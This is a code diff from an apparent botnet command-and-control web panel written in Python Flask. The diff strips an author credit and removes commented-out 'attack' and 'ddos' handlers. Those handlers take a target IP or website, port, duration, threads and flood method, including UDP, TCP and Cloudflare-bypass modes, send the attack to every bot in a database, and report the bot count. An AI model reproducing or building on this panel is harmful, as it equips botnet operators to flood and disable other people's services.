@@ -1,9 +1,3 @@
-'''
-    CookiesKush420#9599
-    github.com/Callumgm
-
-'''
-
 # System Modules
 import os
 import sys
@@ -16,7 +10,6 @@ import subprocess
 import json as jsond 
 
 from concurrent.futures.thread import ThreadPoolExecutor
-from turtle import xcor
 from typing import Tuple
 from uuid import uuid4  
 from time import sleep
@@ -836,73 +829,6 @@ def sendcommands():
 				if command_ == "clear":
 					out = "" # clear output
 					return render_template('sendcommands.html', commandStatus='Output Cleared', commandOutput=out)
-
-				
-# 				elif command_ == "attack": 
-# 					xx = 0
-# 					ddos_method 	= str(request.form.get('ddos-ip-method')).lower()
-# 					ddos_target 	= request.form.get('ddos-ip-target')
-# 					ddos_port 		= request.form.get('ddos-ip-port')
-# 					ddos_time	 	= request.form.get('ddos-ip-time')
-# 					ddos_thread 	= request.form.get('ddos-ip-thread')
-# 					if ddos_method == "udp" or ddos_method == "tcp": 
-# 						try: 
-# 							for x in database:
-# 								with ThreadPoolExecutor(max_workers=500) as executor:
-# 									executor.submit(call_script(xx, str(command))) ; xx+=1
-
-# 							out += "\n\n" + f"""Attack sent successfully
-
-
-#     -------Attack Infomation-------
-
-#     IP:             \t{ddos_target}
-#     Port:           \t{ddos_port}
-#     Bots Amount:    \t{xx}
-#     Attack Time:    \t{ddos_time}s
-#     Attack Method:  \t{ddos_method}
-#     Thread Amount:  \t{ddos_thread}
-# """
-
-# 							return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
-
-# 						except Exception as e: 
-# 							print_debug("Error while sending command: " + str(e))
-# 							return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
-					
-# 					else: out += f"Invalid Attack Method: {ddos_method}"
-
-# 				elif command_ == "ddos": 
-# 					xx = 0
-# 					ddos_method 	= str(request.form.get('ddos-website-method')).lower()
-# 					ddos_target 	= request.form.get('ddos-website-target')
-# 					ddos_time	 	= request.form.get('ddos-website-time')
-# 					ddos_thread 	= request.form.get('ddos-website-thread')
-# 					if ddos_method == "cfb" or ddos_method == "pxcfb" or ddos_method == "cfreq" or ddos_method == "cfsoc": 
-# 						try:
-# 							for x in database:
-# 								with ThreadPoolExecutor(max_workers=500) as executor:
-# 									executor.submit(call_script(xx, str(command))) ; xx+=1
-
-# 							out += "\n\n" + f"""Attack sent successfully
-
-
-#     -------Attack Infomation-------
-
-#     Target:         \t{ddos_target}
-#     Bots Amount:    \t{xx}
-#     Attack Time:    \t{ddos_time}s
-#     Attack Method:  \t{ddos_method}
-#     Thread Amount:  \t{ddos_thread}
-# """
-							
-# 							return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
-						
-# 						except Exception as e: 
-# 							print_debug("Error while sending command: " + str(e))
-# 							return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
-					
-# 					else: out += f"Invalid Attack Method: {ddos_method}" ; return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
 
 				else:
 					command += str(command_check(str(command_)))
